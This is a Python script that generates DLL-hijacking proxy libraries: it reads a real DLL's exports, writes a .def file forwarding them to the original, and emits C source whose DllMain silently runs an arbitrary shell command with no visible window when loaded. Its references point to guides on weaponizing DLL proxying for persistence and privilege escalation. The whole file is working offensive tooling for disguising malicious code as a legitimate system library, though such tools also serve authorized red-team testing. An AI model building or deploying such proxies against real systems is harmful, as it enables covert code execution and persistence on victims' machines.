#!/usr/bin/env python3

import pefile
import argparse
import os
import sys

"""
References:
- https://nibblestew.blogspot.com/2019/05/
- https://googleprojectzero.blogspot.com/2016/02/the-definitive-guide-on-win32-to-nt.html
- https://learn.microsoft.com/en-us/cpp/build/reference/export-exports-a-function
- https://devblogs.microsoft.com/oldnewthing/20121116-00/?p=6073
- https://medium.com/@lsecqt/weaponizing-dll-hijacking-via-dll-proxying-3983a8249de0
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking
- https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence
- https://github.com/Flangvik/SharpDllProxy
- https://github.com/hfiref0x/WinObjEx64
"""

def main():
    # Parse arguments
    parser = argparse.ArgumentParser(description="Generate a proxy DLL")
    parser.add_argument("dll", help="Path to the DLL to generate a proxy for")
    parser.add_argument("--orig-path", "-p", help="The path of the legit .dll file e.g. c:\\Windows\\System32\\version.dll", required=True)
    parser.add_argument("--command", "-c", help="Shell command to execute when DLL is loaded.")
    parser.add_argument("--output", "-o", help="Generated C++ proxy file to write to")
    args = parser.parse_args()
    dll: str = args.dll
    output: str = args.output
    orig_path: str = args.orig_path
    basename = os.path.basename(dll)
    shell_command: str = args.command
    if output is None:
        file, _ = os.path.splitext(basename)
        output = f"proxy_{file}.c"
        output_def = f"proxy_{file}.def"
    else:
        output_def = f"{output.rsplit(".", 1)[0]}.def"

    # Use the system directory if the DLL is not found
    if not os.path.exists(dll) and not os.path.isabs(dll):
        dll = os.path.join(os.environ["SystemRoot"], "System32", dll)
    if not os.path.exists(dll):
        print(f"File not found: {dll}")
        sys.exit(1)

    # Enumerate the exports
    pe = pefile.PE(dll)
    commands = []
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        ordinal = exp.ordinal
        # NONAME proxying is untested, let me know!
        if exp.name is None:
            command = f"__proxy{ordinal}=\"{orig_path}\".#{ordinal} @{ordinal} NONAME\n"
        else:
            name = exp.name.decode()
            command = f"{name}=\"{orig_path}\".{name} @{ordinal}\n"
            # The first underscore is removed by the linker
            if name.startswith("_"):
                command = f"_{command}"
            # Special case for COM exports
            if name in {
                "DllCanUnloadNow",
                "DllGetClassObject",
                "DllInstall",
                "DllRegisterServer",
                "DllUnregisterServer",
                }:
                command += " PRIVATE"
        commands.append(command)

    # Generate the proxy
    with open(output, "w") as f:
        f.write(f"""\
#include <windows.h>

// For 64 bit dll file
// x86_64-w64-mingw32-gcc -shared -o proxy_{basename} {output} {output_def}
// x86_64-w64-mingw32-strip proxy_{basename}
//
// For 32 bit dll file
// i686-w64-mingw32-gcc -shared -o proxy_{basename} {output} {output_def}
// i686-w64-mingw32-strip proxy_{basename}

DWORD RunHiddenCommand(const char* command) {{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    DWORD exit_code = 0xFFFFFFFF;

    // Zero the structures
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // The CREATE_NO_WINDOW flag is what prevents the console window from appearing
    if (CreateProcessA(NULL, (char*)command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)
        ) {{
        // Wait until child process exits
        WaitForSingleObject(pi.hProcess, INFINITE);
        GetExitCodeProcess(pi.hProcess, &exit_code);

        // Always close handles to avoid leaks
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }}
    return exit_code;
}}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{{
    switch (ul_reason_for_call)
    {{
    case DLL_PROCESS_ATTACH: 
        {{
            // MessageBoxA(NULL, "Executing from Malicious DLL", "Executing from Malicious DLL", 0);
            // Insert command here.
            RunHiddenCommand("{shell_command}");
        }};
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }}
    return TRUE;
}}
""")
    with open(output_def, "wt") as df:
        df.write("EXPORTS\n")
        for command in commands:
            df.write(command)


if __name__ == "__main__":
    main()